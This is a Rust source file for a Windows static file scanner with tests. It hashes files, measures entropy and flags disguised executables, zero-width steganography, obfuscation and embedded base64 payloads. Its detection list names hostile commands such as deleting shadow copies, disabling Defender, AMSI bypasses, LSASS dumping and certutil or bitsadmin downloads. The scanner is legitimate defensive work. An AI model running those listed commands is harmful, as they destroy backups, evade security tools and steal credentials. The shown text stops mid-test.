use crate::modules::i18n::{current_index, tr4, tr4_with};
use md5::Digest as _;
use serde::{Deserialize, Serialize};
use std::ffi::c_void;
use std::fs::File;
use std::io::Read;
use std::path::Path;

#[cfg(windows)]
#[repr(C)]
struct OpenFileNameW {
    l_struct_size: u32,
    hwnd_owner: *mut c_void,
    instance: *mut c_void,
    filter: *const u16,
    custom_filter: *mut u16,
    max_cust_filter: u32,
    filter_index: u32,
    file: *mut u16,
    max_file: u32,
    file_title: *mut u16,
    max_file_title: u32,
    initial_dir: *const u16,
    title: *const u16,
    flags: u32,
    file_offset: u16,
    file_extension: u16,
    def_ext: *const u16,
    cust_data: usize,
    fn_hook: *mut c_void,
    template_name: *const u16,
    pv_reserved: *mut c_void,
    dw_reserved: u32,
    flags_ex: u32,
}

#[cfg(windows)]
#[link(name = "comdlg32", kind = "raw-dylib", modifiers = "+verbatim")]
unsafe extern "system" {
    fn GetOpenFileNameW(lpofn: *mut OpenFileNameW) -> i32;
}

/// Open the native file picker. `owner_hwnd` should be the HWND of the main
/// window; with a null owner the dialog can appear BEHIND the app. The call
/// runs its own modal Win32 message loop, so invoke it from the event-loop
/// thread — the UI keeps repainting while it is open.
#[cfg(windows)]
pub fn pick_file_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let mut file_buf = vec![0u16; 1024];
    let title: Vec<u16> = tr4(
        "Chọn tệp cần quét bảo mật",
        "Select File to Scan",
        "选择要扫描的文件",
        "Выберите файл для проверки",
    )
    .encode_utf16()
    .chain(std::iter::once(0))
    .collect();
    let filter: Vec<u16> = format!(
        "{} (*.*)\0*.*\0{} (*.tmf;*.log;*.etl;*.evtx)\0*.tmf;*.log;*.etl;*.evtx\0{} (*.exe;*.dll;*.bat;*.cmd;*.ps1;*.vbs;*.js)\0*.exe;*.dll;*.bat;*.cmd;*.ps1;*.vbs;*.js\0{} (*.txt;*.pdf;*.doc;*.docx;*.rtf;*.log)\0*.txt;*.pdf;*.doc;*.docx;*.rtf;*.log\0\0",
        tr4("Tất cả tệp", "All Files", "所有文件", "Все файлы"),
        tr4("Tệp dấu vết", "Trace Files", "跟踪文件", "Файлы трассировки"),
        tr4("Tập lệnh và tệp thực thi", "Scripts & Executables", "脚本和可执行文件", "Сценарии и исполняемые файлы"),
        tr4("Tài liệu và văn bản", "Documents & Text", "文档和文本", "Документы и текст"),
    ).encode_utf16().collect();

    let mut ofn = OpenFileNameW {
        l_struct_size: std::mem::size_of::<OpenFileNameW>() as u32,
        hwnd_owner: owner_hwnd,
        instance: std::ptr::null_mut(),
        filter: filter.as_ptr(),
        custom_filter: std::ptr::null_mut(),
        max_cust_filter: 0,
        filter_index: 1,
        file: file_buf.as_mut_ptr(),
        max_file: file_buf.len() as u32,
        file_title: std::ptr::null_mut(),
        max_file_title: 0,
        initial_dir: std::ptr::null(),
        title: title.as_ptr(),
        flags: 0x00000800 | 0x00001000 | 0x00080000,
        file_offset: 0,
        file_extension: 0,
        def_ext: std::ptr::null(),
        cust_data: 0,
        fn_hook: std::ptr::null_mut(),
        template_name: std::ptr::null(),
        pv_reserved: std::ptr::null_mut(),
        dw_reserved: 0,
        flags_ex: 0,
    };

    let ok = unsafe { GetOpenFileNameW(&mut ofn) };
    if ok != 0 {
        let end = file_buf
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(file_buf.len());
        Some(String::from_utf16_lossy(&file_buf[..end]))
    } else {
        None
    }
}

#[cfg(not(windows))]
pub fn pick_file_dialog(owner_hwnd: *mut c_void) -> Option<String> {
    let _ = owner_hwnd;
    None
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileFinding {
    pub severity: String,
    pub category: String,
    pub description: String,
    pub snippet: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileScanReport {
    pub file_path: String,
    pub file_name: String,
    pub file_size_bytes: u64,
    pub md5: String,
    pub sha1: String,
    pub sha256: String,
    pub entropy: f64,
    pub risk_score: i32,
    pub risk_level: String,
    pub is_pe: bool,
    pub is_packed: bool,
    pub findings: Vec<FileFinding>,
    pub summary_text: String,
}

pub fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn safe_char_boundary_slice(s: &str, byte_idx: usize, pattern_len: usize) -> String {
    let mut start = byte_idx.saturating_sub(20);
    while start > 0 && !s.is_char_boundary(start) {
        start -= 1;
    }
    let mut end = (byte_idx + pattern_len + 30).min(s.len());
    while end < s.len() && !s.is_char_boundary(end) {
        end += 1;
    }
    s[start..end].replace('\n', " ").replace('\r', "")
}

pub fn scan_file<P: AsRef<Path>>(path: P) -> Result<FileScanReport, String> {
    let p = path.as_ref();
    if !p.exists() {
        return Err(tr4(
            "Tệp không tồn tại",
            "File does not exist",
            "文件不存在",
            "Файл не существует",
        )
        .to_string());
    }
    let metadata = p.metadata().map_err(|e| {
        format!(
            "{}: {e}",
            tr4(
                "Không đọc được thông tin tệp",
                "Cannot read file metadata",
                "无法读取文件信息",
                "Не удалось прочитать метаданные файла"
            )
        )
    })?;
    if !metadata.is_file() {
        return Err(tr4(
            "Đường dẫn không phải là tệp thông thường",
            "Path is not a regular file",
            "路径不是常规文件",
            "Путь не является обычным файлом",
        )
        .to_string());
    }

    let file_size_bytes = metadata.len();
    let file_name = p
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_default();

    let mut file = File::open(p).map_err(|e| {
        format!(
            "{}: {e}",
            tr4(
                "Không mở được tệp để đọc",
                "Cannot open file for reading",
                "无法打开文件进行读取",
                "Не удалось открыть файл для чтения"
            )
        )
    })?;
    // Static-analysis window capped at 16 MB: entropy/PE/text heuristics are
    // fully effective on the first megabytes, while a 64 MB window could spike
    // the working set ~190 MB (buffer + lossy + lowercase copies). Hashes below
    // still stream over the ENTIRE file, so integrity output is unaffected.
    let max_read = (file_size_bytes as usize).min(16 * 1024 * 1024);
    let mut buffer = vec![0u8; max_read];
    file.read_exact(&mut buffer).map_err(|e| {
        format!(
            "{}: {e}",
            tr4(
                "Không đọc được dữ liệu tệp",
                "Cannot read file bytes",
                "无法读取文件字节",
                "Не удалось прочитать байты файла"
            )
        )
    })?;

    let mut md5_h = md5::Md5::new();
    let mut sha1_h = sha1::Sha1::new();
    let mut sha256_h = sha2::Sha256::new();
    md5_h.update(&buffer);
    sha1_h.update(&buffer);
    sha256_h.update(&buffer);

    if file_size_bytes > max_read as u64 {
        let mut stream_chunk = [0u8; 65536];
        loop {
            match file.read(&mut stream_chunk) {
                Ok(0) => break,
                Ok(n) => {
                    md5_h.update(&stream_chunk[..n]);
                    sha1_h.update(&stream_chunk[..n]);
                    sha256_h.update(&stream_chunk[..n]);
                }
                Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
                Err(e) => {
                    return Err(format!(
                        "{}: {e}",
                        tr4(
                            "Không đọc được dữ liệu tệp",
                            "Cannot read file bytes",
                            "无法读取文件字节",
                            "Не удалось прочитать байты файла"
                        )
                    ))
                }
            }
        }
    }

    let md5_str = format!("{:x}", md5_h.finalize());
    let sha1_str = format!("{:x}", sha1_h.finalize());
    let sha256_str = format!("{:x}", sha256_h.finalize());

    let entropy = calculate_entropy(&buffer);
    let is_packed = entropy >= 7.2;

    let is_pe = buffer.starts_with(b"MZ");
    let ext = p
        .extension()
        .map(|e| e.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default();

    let mut findings = Vec::new();
    let mut risk_score: i32 = 0;

    if file_name.contains('\u{202E}') {
        risk_score += 45;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "RTLO Extension Spoofing".to_string(),
            description: tr4(
                "Ký tự Unicode RTLO (\\u202E) đảo ngược hiển thị phần mở rộng tệp.",
                "Unicode RTLO character (\\u202E) reverses the displayed file extension.",
                "Unicode RTLO 字符 (\\u202E) 会反转文件扩展名的显示。",
                "Символ Юникода RTLO (\\u202E) переворачивает отображение расширения файла.",
            )
            .to_string(),
            snippet: file_name.clone(),
        });
    }

    let non_exe_exts = [
        "txt", "jpg", "jpeg", "png", "gif", "pdf", "doc", "docx", "xls", "xlsx", "mp4", "mp3",
        "csv", "log", "ini", "json", "xml", "html", "css", "tmf", "etl", "evtx",
    ];
    if is_pe && non_exe_exts.contains(&ext.as_str()) {
        risk_score += 55;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Disguised Executable".to_string(),
            description: tr4(
                "Tệp thực thi Windows (PE/MZ) nguỵ trang nguy hiểm dưới phần mở rộng .{ext}!",
                "A Windows executable (PE/MZ) is dangerously disguised with the .{ext} extension!",
                "Windows 可执行文件 (PE/MZ) 危险地伪装成 .{ext} 扩展名！",
                "Исполняемый файл Windows (PE/MZ) опасно замаскирован под расширение .{ext}!",
            )
            .replace("{ext}", &ext),
            snippet: format!("Extension: .{ext} | Header: MZ (0x4D5A)"),
        });
    }

    if is_packed {
        risk_score += 25;
        findings.push(FileFinding {
            severity: "MEDIUM".to_string(),
            category: "High Entropy (Packing/Encryption)".to_string(),
            description: tr4(
                "Độ hỗn loạn Entropy cao ({e:.2}/8.0), có thể do trình nén mã (packer) hoặc dữ liệu bị mã hoá; cần kiểm tra thêm.",
                "High entropy ({e:.2}/8.0), possibly caused by a packer or encrypted data; further review is needed.",
                "熵值较高 ({e:.2}/8.0)，可能是加壳程序或加密数据；需要进一步检查。",
                "Высокая энтропия ({e:.2}/8.0), возможны упаковщик или зашифрованные данные; требуется дополнительная проверка.",
            )
            .replace("{e:.2}", &format!("{:.2}", entropy)),
            snippet: format!("Entropy: {:.3}", entropy),
        });
    }

    let text_content = String::from_utf8_lossy(&buffer);

    let zw_chars = [
        '\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}', '\u{2060}', '\u{200E}', '\u{200F}',
    ];
    let zw_count: usize = text_content
        .chars()
        .filter(|c| zw_chars.contains(c))
        .count();
    if zw_count >= 8 {
        risk_score += 35;
        findings.push(FileFinding {
            severity: "HIGH".to_string(),
            category: "Hidden Steganography".to_string(),
            description: format!(
                "Phát hiện {zw_count} ký tự Unicode vô hình (Zero-Width) nghi vấn che giấu dữ liệu mật hoặc shellcode."
            ),
            snippet: format!("Zero-width characters count: {zw_count}"),
        });
    }

    let lower_text = text_content.to_ascii_lowercase();
    let trimmed_lower = lower_text.trim_start();
    let greetings = [
        "xin chào",
        "xin chao",
        "hello",
        "hi ",
        "greetings",
        "你好",
        "您好",
        "привет",
        "здравствуйте",
        "halo",
        "hola",
        "dear friend",
    ];
    let starts_with_greeting = {
        // Full Unicode lowercase so non-ASCII greetings ("Привет",
        // "Здравствуйте") still match — to_ascii_lowercase leaves Cyrillic.
        let greeting_text = text_content.to_lowercase();
        let greeting_trimmed = greeting_text.trim_start();
        greetings.iter().any(|&g| greeting_trimmed.starts_with(g))
    };

    let suspicious_commands = [
        (
            "set-mppreference -disablerealtimemonitoring",
            "CRITICAL",
            50,
            "Tắt tính năng bảo vệ Windows Defender theo thời gian thực",
        ),
        (
            "vssadmin delete shadows",
            "CRITICAL",
            50,
            "Xoá điểm phục hồi Volume Shadow Copies (dấu hiệu Ransomware)",
        ),
        (
            "wbadmin delete catalog",
            "CRITICAL",
            50,
            "Xoá nhật ký sao lưu hệ thống (Ransomware evasion)",
        ),
        (
            "bcdedit /set {default} recoveryenabled no",
            "CRITICAL",
            45,
            "Vô hiệu hóa tính năng phục hồi tự động của Windows",
        ),
        (
            "amsiutils",
            "CRITICAL",
            45,
            "Kỹ thuật can thiệp Antimalware Scan Interface (AMSI Bypass)",
        ),
        (
            "amsiinitfailed",
            "CRITICAL",
            45,
            "Kỹ thuật vô hiệu hóa kiểm tra AMSI Init",
        ),
        (
            "minidumpwritedump",
            "HIGH",
            40,
            "Khai thác trích xuất bộ nhớ tiến trình (Credential Dumping / LSASS)",
        ),
        (
            "-encodedcommand",
            "HIGH",
            35,
            "Lệnh PowerShell mã hoá Base64 (-EncodedCommand)",
        ),
        (
            "-enc ",
            "HIGH",
            35,
            "Lệnh PowerShell rút gọn mã hoá Base64 (-enc)",
        ),
        (
            "downloadstring",
            "HIGH",
            30,
            "PowerShell tải mã thực thi từ xa qua DownloadString",
        ),
        (
            "downloadfile",
            "HIGH",
            30,
            "PowerShell tải tệp thực thi qua DownloadFile",
        ),
        (
            "invoke-expression",
            "HIGH",
            25,
            "Thực thi chuỗi động nguy hiểm (Invoke-Expression)",
        ),
        (
            "| iex",
            "HIGH",
            25,
            "Thực thi chuỗi động qua pipeline (| iex)",
        ),
        (
            "|iex",
            "HIGH",
            25,
            "Thực thi chuỗi động qua pipeline (|iex)",
        ),
        (
            "certutil -urlcache",
            "HIGH",
            25,
            "LOLBin certutil tải tệp lạ từ Internet (-urlcache)",
        ),
        (
            "certutil -decode",
            "HIGH",
            25,
            "LOLBin certutil giải mã tệp độc hại (-decode)",
        ),
        (
            "bitsadmin /transfer",
            "HIGH",
            25,
            "LOLBin bitsadmin tải tệp chạy ngầm (/transfer)",
        ),
        (
            "regsvr32 /s /u",
            "HIGH",
            25,
            "LOLBin regsvr32 thực thi DLL không giám sát",
        ),
        (
            "rundll32.exe",
            "HIGH",
            20,
            "LOLBin rundll32 thực thi thư viện động",
        ),
        (
            "mshta.exe",
            "HIGH",
            25,
            "LOLBin mshta thực thi HTML Application",
        ),
    ];

    let mut found_command_count = 0;
    let mut scored_command_families = std::collections::HashSet::new();
    for &(cmd, sev, risk_inc, desc) in &suspicious_commands {
        if contains_command_token(&lower_text, cmd.trim_end()) {
            found_command_count += 1;
            let family = command_evidence_family(cmd);
            if scored_command_families.insert(family) {
                risk_score += risk_inc;
            }
            let idx = lower_text.find(cmd).unwrap_or(0);
            let snippet = safe_char_boundary_slice(&text_content, idx, cmd.len());
            findings.push(FileFinding {
                severity: sev.to_string(),
                category: "Malicious Command Pattern".to_string(),
                description: desc.to_string(),
                snippet,
            });
        }
    }

    if starts_with_greeting && (found_command_count > 0 || is_pe || zw_count >= 8) {
        risk_score += 45;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Deceptive Greeting Wrapper".to_string(),
            description: "Tệp mở đầu bằng lời chào ngây thơ (\"Xin chào / Hello / 你好 / Привет\"), nhưng thực tế nguỵ trang cho lệnh thực thi độc hại hoặc payload ẩn!".to_string(),
            snippet: trimmed_lower.chars().take(60).collect(),
        });
    }

    if ext == "tmf" {
        scan_tmf_file(
            &text_content,
            &mut findings,
            &mut risk_score,
            &scored_command_families,
        );
    }

    scan_hidden_deceptive_code(&text_content, &mut findings, &mut risk_score);

    scan_embedded_base64(&text_content, &mut findings, &mut risk_score);

    risk_score = risk_score.clamp(0, 100);

    let risk_level = if risk_score >= 60 {
        "MALICIOUS"
    } else if risk_score >= 25 {
        "SUSPICIOUS"
    } else {
        "SAFE"
    };

    let summary_text = localized_summary(current_index(), risk_level, findings.len(), risk_score);

    Ok(FileScanReport {
        file_path: p.to_string_lossy().to_string(),
        file_name,
        file_size_bytes,
        md5: md5_str,
        sha1: sha1_str,
        sha256: sha256_str,
        entropy,
        risk_score,
        risk_level: risk_level.to_string(),
        is_pe,
        is_packed,
        findings,
        summary_text,
    })
}

// Explicit language makes summary tests independent of the process-wide language.
fn localized_summary(lang: u8, risk_level: &str, finding_count: usize, score: i32) -> String {
    let assessment = match risk_level {
        "MALICIOUS" => tr4_with(
            lang,
            "CẢNH BÁO: Phát hiện dấu hiệu rủi ro cao; cần kiểm tra thêm.",
            "WARNING: High-risk indicators found; further review is needed.",
            "警告：发现高风险迹象；需要进一步检查。",
            "ПРЕДУПРЕЖДЕНИЕ: Обнаружены признаки высокого риска; нужна дополнительная проверка.",
        ),
        "SUSPICIOUS" => tr4_with(
            lang,
            "CHÚ Ý: Phát hiện dấu hiệu đáng ngờ cần kiểm tra.",
            "CAUTION: Suspicious indicators found that need review.",
            "注意：发现可疑迹象，需要检查。",
            "ВНИМАНИЕ: Обнаружены подозрительные признаки, требующие проверки.",
        ),
        _ => tr4_with(
            lang,
            "Chưa phát hiện dấu hiệu rủi ro cao trong phạm vi kiểm tra.",
            "No high-risk indicators found within the inspected scope.",
            "在检查范围内未发现高风险迹象。",
            "В пределах проверки признаки высокого риска не обнаружены.",
        ),
    };
    let count_label = tr4_with(
        lang,
        "Số phát hiện",
        "Findings",
        "发现数量",
        "Число находок",
    );
    let score_label = tr4_with(
        lang,
        "Điểm rủi ro",
        "Risk score",
        "风险评分",
        "Оценка риска",
    );
    let limits = tr4_with(lang,
        "Phân tích tĩnh theo heuristic chỉ kiểm tra tối đa 16 MiB đầu tiên; mã băm bao phủ toàn bộ tệp. Kết quả không chứng minh tệp an toàn hoặc có mã độc.",
        "Static heuristics inspect at most the first 16 MiB; hashes cover the entire file. Results do not prove safety or maliciousness.",
        "静态启发式分析最多检查前 16 MiB；哈希覆盖整个文件。结果不能证明文件安全或具有恶意。",
        "Статические эвристики проверяют только первые 16 MiB; хеши охватывают весь файл. Результаты не доказывают безопасность или вредоносность.");
    format!("\u{1f44b} Hello! {assessment} {count_label}: {finding_count}. {score_label}: {score}/100. {limits}")
}

fn command_evidence_family(command: &str) -> &str {
    match command {
        "| iex" | "|iex" => "invoke-expression",
        "-enc " => "-encodedcommand",
        "certutil -urlcache" | "certutil -decode" => "certutil",
        c => c,
    }
}

fn contains_command_token(text: &str, keyword: &str) -> bool {
    text.match_indices(keyword).any(|(start, matched)| {
        let token_char = |c: char| c.is_alphanumeric() || c == '_';
        let end = start + matched.len();
        !text[..start].chars().next_back().is_some_and(token_char)
            && !text[end..].chars().next().is_some_and(token_char)
    })
}

fn scan_tmf_file(
    text: &str,
    findings: &mut Vec<FileFinding>,
    risk_score: &mut i32,
    scored_commands: &std::collections::HashSet<&str>,
) {
    let lower = text.to_ascii_lowercase();

    // TMF stores format metadata; printf tokens alone do not establish execution.

    let injected_commands = [
        (
            "powershell",
            "Lệnh PowerShell nhúng trong tệp định dạng dấu vết TMF",
        ),
        ("cmd.exe", "Lệnh Command Prompt nhúng trong TMF"),
        (
            "downloadstring",
            "PowerShell WebClient payload nhúng trong TMF",
        ),
        ("iex", "Lệnh thực thi chuỗi động (IEX) nhúng trong TMF"),
        ("mshta", "Lệnh MSHTA HTML Application nhúng trong TMF"),
        ("cscript", "Script engine cscript nhúng trong TMF"),
        ("wscript", "Script engine wscript nhúng trong TMF"),
        ("certutil", "LOLBin certutil nhúng trong TMF"),
        ("bitsadmin", "LOLBin bitsadmin nhúng trong TMF"),
        ("rundll32", "Thực thi DLL rundll32 nhúng trong TMF"),
    ];
    for (pat, desc) in &injected_commands {
        let family = match *pat {
            "iex" => "invoke-expression",
            "rundll32" => "rundll32.exe",
            "mshta" => "mshta.exe",
            "bitsadmin" => "bitsadmin /transfer",
            other => other,
        };
        let already_reported = scored_commands.contains(family);
        if contains_command_token(&lower, pat) && !already_reported {
            *risk_score += 45;
            findings.push(FileFinding {
                severity: "CRITICAL".to_string(),
                category: "Injected Code in TMF Trace Format".to_string(),
                description: format!("Phát hiện mã độc tiêm vào tệp TMF: {desc}"),
                snippet: pat.to_string(),
            });
        }
    }

    if lower.contains("\\x90\\x90\\x90")
        || lower.contains("0x90,0x90,0x90")
        || lower.contains("0x90, 0x90, 0x90")
    {
        *risk_score += 50;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Embedded Shellcode NOP Sled in TMF".to_string(),
            description: "Dãy mã máy NOP sled (0x90) thường dùng trong khai thác bộ nhớ / shellcode nhúng trong tệp TMF!".to_string(),
            snippet: "NOP sled sequence detected".to_string(),
        });
    }
}

// Match a whole identifier/command token, not a substring elsewhere in the
// document. Edge separators (for example Markdown code quotes) do not count:
// at least one separator must split characters of the matching token itself.
fn has_split_token(text: &str, keyword: &str, separator: char) -> bool {
    text.split(|c: char| {
        !(c.is_alphanumeric() || c == '_' || c == '-' || c == '.' || c == separator)
    })
    .any(|token| {
        let interior = token.trim_matches(separator);
        interior.contains(separator) && interior.replace(separator, "") == keyword
    })
}

fn scan_hidden_deceptive_code(text: &str, findings: &mut Vec<FileFinding>, risk_score: &mut i32) {
    let lower = text.to_ascii_lowercase();

    if lower.contains('`') {
        let suspicious = [
            "powershell",
            "downloadstring",
            "invoke-expression",
            "iex",
            "system.net.webclient",
            "bypass",
        ];
        for s in &suspicious {
            if has_split_token(&lower, s, '`') {
                *risk_score += 40;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "Backtick Obfuscation Evasion".to_string(),
                    description: format!("Kỹ thuật chèn dấu phẩy ngược (backtick) để che giấu từ khóa nguy hiểm '{s}'."),
                    snippet: format!("De-obfuscated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains('^') {
        let suspicious = [
            "powershell",
            "cmd.exe",
            "downloadstring",
            "invoke-expression",
            "vssadmin",
            "certutil",
        ];
        for s in &suspicious {
            if has_split_token(&lower, s, '^') {
                *risk_score += 40;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "Caret Escape Obfuscation".to_string(),
                    description: format!("Kỹ thuật chèn dấu mũ (caret ^) để ngụy trang câu lệnh độc hại '{s}' trong CMD/BAT."),
                    snippet: format!("De-obfuscated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains("'+'") || lower.contains("\"+\"") {
        let deconcat = lower
            .replace("'+'", "")
            .replace("\"+\"", "")
            .replace("' + '", "")
            .replace("\" + \"", "");
        let suspicious = [
            "downloadstring",
            "invoke-expression",
            "iex",
            "webclient",
            "bypass",
            "hidden",
        ];
        for s in &suspicious {
            if deconcat.contains(s) && !lower.contains(s) {
                *risk_score += 35;
                findings.push(FileFinding {
                    severity: "HIGH".to_string(),
                    category: "String Concatenation Evasion".to_string(),
                    description: format!(
                        "Kỹ thuật ghép chuỗi ký tự rời rạc để trốn tránh phát hiện lệnh '{s}'."
                    ),
                    snippet: format!("De-concatenated: {s}"),
                });
                break;
            }
        }
    }

    if lower.contains("\\x4d\\x5a") || lower.contains("0x4d, 0x5a") || lower.contains("0x4d,0x5a") {
        *risk_score += 55;
        findings.push(FileFinding {
            severity: "CRITICAL".to_string(),
            category: "Disguised Hex Executable (MZ Header)".to_string(),
            description: "Dữ liệu Hex thô chứa chữ ký PE Executable (MZ - 0x4D 0x5A) ngụy trang dạng chuỗi văn bản!".to_string(),
            snippet: "MZ (0x4D, 0x5A) hex stream found".to_string(),
        });
    }

    let zw_0 = '\u{200B}';
    let zw_1 = '\u{200C}';
    if text.contains(zw_0) && text.contains(zw_1) {
        let mut bits = String::new();
        for c in text.chars() {
            if c == zw_0 {
                bits.push('0');
            } else if c == zw_1 {
                bits.push('1');
            }
        }
        if bits.len() >= 16 {
            let mut decoded_bytes = Vec::new();
            for chunk in bits.as_bytes().chunks(8) {
                if chunk.len() == 8 {
                    if let Ok(byte_str) = std::str::from_utf8(chunk) {
                        if let Ok(b) = u8::from_str_radix(byte_str, 2) {
                            decoded_bytes.push(b);
                        }
                    }
                }
            }
            if !decoded_bytes.is_empty() {
                let decoded_str = String::from_utf8_lossy(&decoded_bytes).to_ascii_lowercase();
                if decoded_str.contains("http")
                    || decoded_str.contains("cmd")
                    || decoded_str.contains("powershell")
                    || decoded_bytes.starts_with(b"MZ")
                {
                    *risk_score += 60;
                    findings.push(FileFinding {
                        severity: "CRITICAL".to_string(),
                        category: "Decoded Zero-Width Steganography Payload".to_string(),
                        description: "Giải mã thành công thông điệp ẩn giấu trong ký tự Zero-Width: Chứa mã độc hoặc URL điều khiển ngầm!".to_string(),
                        snippet: decoded_str.chars().take(60).collect(),
                    });
                }
            }
        }
    }
}

fn has_pe_structure(bytes: &[u8]) -> bool {
    let read16 = |offset: usize| {
        bytes
            .get(offset..offset.checked_add(2)?)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
    };
    let read32 = |offset: usize| {
        bytes
            .get(offset..offset.checked_add(4)?)
            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
    };
    if !bytes.starts_with(b"MZ") {
        return false;
    }
    let Some(pe) = read32(0x3c).map(|v| v as usize) else {
        return false;
    };
    if pe < 64 || pe > bytes.len().saturating_sub(24) || bytes.get(pe..pe + 4) != Some(b"PE\0\0") {
        return false;
    }
    let Some(sections) = read16(pe + 6) else {
        return false;
    };
    let Some(optional_size) = read16(pe + 20).map(usize::from) else {
        return false;
    };
    let optional = pe + 24;
    let minimum = match read16(optional) {
        Some(0x10b) => 96,
        Some(0x20b) => 112,
        _ => return false,
    };
    if sections == 0 || sections > 96 || optional_size < minimum {
        return false;
    }
    let Some(table) = optional.checked_add(optional_size) else {
        return false;
    };
    let Some(end) = table.checked_add(usize::from(sections) * 40) else {
        return false;
    };
    if end > bytes.len() {
        return false;
    }
    for section in 0..usize::from(sections) {
        let base = table + section * 40;
        let Some(size) = read32(base + 16).map(|v| v as usize) else {
            return false;
        };
        let Some(offset) = read32(base + 20).map(|v| v as usize) else {
            return false;
        };
        if size > 0 && (offset < end || offset.checked_add(size).is_none_or(|v| v > bytes.len())) {
            return false;
        }
    }
    true
}

fn scan_embedded_base64(text: &str, findings: &mut Vec<FileFinding>, risk_score: &mut i32) {
    use base64::Engine;
    let bytes = text.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if is_b64_char(bytes[i]) {
            let start = i;
            while i < bytes.len() && is_b64_char(bytes[i]) {
                i += 1;
            }
            let chunk_len = i - start;
            if chunk_len >= 56 {
                let candidate = &text[start..i];
                if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(candidate) {
                    if has_pe_structure(&decoded) {
                        *risk_score += 50;
                        findings.push(FileFinding {
                            severity: "CRITICAL".to_string(),
                            category: "Embedded Executable in Base64".to_string(),
                            description: "Khối Base64 có cấu trúc PE Windows hợp lệ trong phạm vi kiểm tra; đây là dấu hiệu cần xem xét, không chứng minh mã độc.".to_string(),
                            snippet: format!("Base64 chunk ({} chars) -> Decoded PE ({} bytes)", chunk_len, decoded.len()),
                        });
                        break;
                    }
                    let dec_str = String::from_utf8_lossy(&decoded).to_ascii_lowercase();
                    if dec_str.contains("powershell")
                        || dec_str.contains("downloadstring")
                        || dec_str.contains("cmd.exe")
                    {
                        *risk_score += 35;
                        findings.push(FileFinding {
                            severity: "HIGH".to_string(),
                            category: "Encoded Script Payload".to_string(),
                            description: "Khối Base64 giải mã ra lệnh PowerShell / CMD độc hại!"
                                .to_string(),
                            snippet: dec_str.chars().take(80).collect(),
                        });
                        break;
                    }
                }
            }
        } else {
            i += 1;
        }
    }
}

fn is_b64_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'='
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn tmf_format_tokens_alone_do_not_score_as_exploitation() {
        let mut findings = Vec::new();
        let mut score = 0;
        scan_tmf_file(
            "Trace format reference: %n %p%p%p%p %x%x%x%x%x",
            &mut findings,
            &mut score,
            &std::collections::HashSet::new(),
        );
        assert_eq!(score, 0);
        assert!(findings.is_empty());
    }

    #[test]
    fn pipeline_iex_counts_once_across_variants() {
        let path = std::env::temp_dir().join(format!("sg_iex_alias_{}.tmf", std::process::id()));
        std::fs::write(&path, "| iex another |iex and invoke-expression").unwrap();
        let report = scan_file(&path).unwrap();
        std::fs::remove_file(path).unwrap();
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|f| f.category == "Malicious Command Pattern")
                .count(),
            3
        );
        assert_eq!(
            report.risk_score, 25,
            "aliases and TMF context must not rescore execution"
        );
    }

    #[test]
    fn benign_tmf_trace_tokens_not_flagged() {
        let mut findings = Vec::new();
        let mut score = 0;
        scan_tmf_file(
            "%1!ws! imagename [%2] %3!d! %%bytes iexflag_powershell_profile.txt",
            &mut findings,
            &mut score,
            &std::collections::HashSet::new(),
        );
        assert!(findings.is_empty(), "real trace format tokens are benign");
        assert_eq!(score, 0);
    }

    #[test]
    fn tmf_does_not_rescore_existing_command_evidence() {
        let mut findings = vec![FileFinding {
            severity: "HIGH".into(),
            category: "Malicious Command Pattern".into(),
            description: "Existing generic finding".into(),
            snippet: "downloadstring".into(),
        }];
        let mut score = 30;
        scan_tmf_file(
            "downloadstring",
            &mut findings,
            &mut score,
            &std::collections::HashSet::from(["downloadstring"]),
        );
        assert_eq!(score, 30, "TMF must not score the same command twice");
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn embedded_pe_requires_bounded_headers() {
        use base64::Engine;
        let mut data = vec![0u8; 512];
        data[..2].copy_from_slice(b"MZ");
        assert!(!has_pe_structure(&data));
        let mut findings = Vec::new();
        let mut score = 0;
        scan_embedded_base64(
            &base64::engine::general_purpose::STANDARD.encode(&data),
            &mut findings,
            &mut score,
        );
        assert!(findings.is_empty());
        data[60..64].copy_from_slice(&64u32.to_le_bytes());
        data[64..68].copy_from_slice(b"PE\0\0");
        data[70..72].copy_from_slice(&1u16.to_le_bytes());
        data[84..86].copy_from_slice(&96u16.to_le_bytes());
        data[88..90].copy_from_slice(&0x10bu16.to_le_bytes());
        assert!(has_pe_structure(&data));
        scan_embedded_base64(
            &base64::engine::general_purpose::STANDARD.encode(&data),
            &mut findings,
            &mut score,
        );
        assert_eq!(findings.len(), 1);
        data[200..204].copy_from_slice(&500u32.to_le_bytes());
        data[204..208].copy_from_slice(&500u32.to_le_bytes());
        assert!(!has_pe_structure(&data));
        data[60..64].copy_from_slice(&u32::MAX.to_le_bytes());
        assert!(!has_pe_structure(&data));
    }

    #[test]
    fn test_calculate_entropy() {
        let zeros = vec![0u8; 1000];
        assert_eq!(calculate_entropy(&zeros), 0.0);

